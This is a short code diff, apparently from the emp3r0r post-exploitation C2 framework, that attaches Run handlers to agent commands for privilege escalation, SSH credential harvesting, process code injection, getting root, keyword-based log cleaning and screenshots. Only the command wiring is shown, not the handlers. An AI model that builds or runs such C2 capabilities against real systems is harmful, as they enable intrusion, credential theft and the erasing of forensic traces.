@@ -201,6 +201,7 @@ func C2Commands() *cobra.Command {
 		Short:   "Run LPE script",
 		Example: "!lpe --script_name <script_name> --checksum <checksum>",
 		GroupID: "generic",
+		Run:     runLPELinux,
 	}
 	lpeCmd.Flags().StringP("script_name", "s", "", "Script name")
 	lpeCmd.Flags().StringP("checksum", "c", "", "Checksum")
@@ -212,6 +213,7 @@ func C2Commands() *cobra.Command {
 		Short:   "Start SSH harvester",
 		Example: "!ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>",
 		GroupID: "generic",
+		Run:     runSSHHarvesterLinux,
 	}
 	sshHarvesterCmd.Flags().StringP("code_pattern", "p", "", "Code pattern")
 	sshHarvesterCmd.Flags().StringP("reg_name", "r", "RBP", "Register name")
@@ -224,6 +226,7 @@ func C2Commands() *cobra.Command {
 		Short:   "Inject code",
 		Example: "!inject --method <method> --pid <pid> --checksum <checksum>",
 		GroupID: "linux",
+		Run:     runInjectLinux,
 	}
 	injectCmd.Flags().StringP("method", "m", "", "Injection method")
 	injectCmd.Flags().StringP("pid", "p", "", "Process ID")
@@ -246,6 +249,7 @@ func C2Commands() *cobra.Command {
 		Short:   "Attempt to gain root privileges",
 		Example: "!get_root",
 		GroupID: "linux",
+		Run:     runGetRootLinux,
 	}
 	rootCmd.AddCommand(getRootCmd)
 
@@ -255,6 +259,7 @@ func C2Commands() *cobra.Command {
 		Short:   "Clean logs",
 		Example: "!clean_log --keyword <keyword>",
 		GroupID: "linux",
+		Run:     runCleanLogLinux,
 	}
 	cleanLogCmd.Flags().StringP("keyword", "k", "", "Keyword to clean logs")
 	rootCmd.AddCommand(cleanLogCmd)
@@ -262,8 +267,8 @@ func C2Commands() *cobra.Command {
 	screenshotCmd := &cobra.Command{
 		Use:     emp3r0r_def.C2CmdScreenshot,
 		Short:   "Take screenshot",
-		Run:     screenshotCmdRun,
 		GroupID: "generic",
+		Run:     screenshotCmdRun,
 	}
 	rootCmd.AddCommand(screenshotCmd)
 	return rootCmd
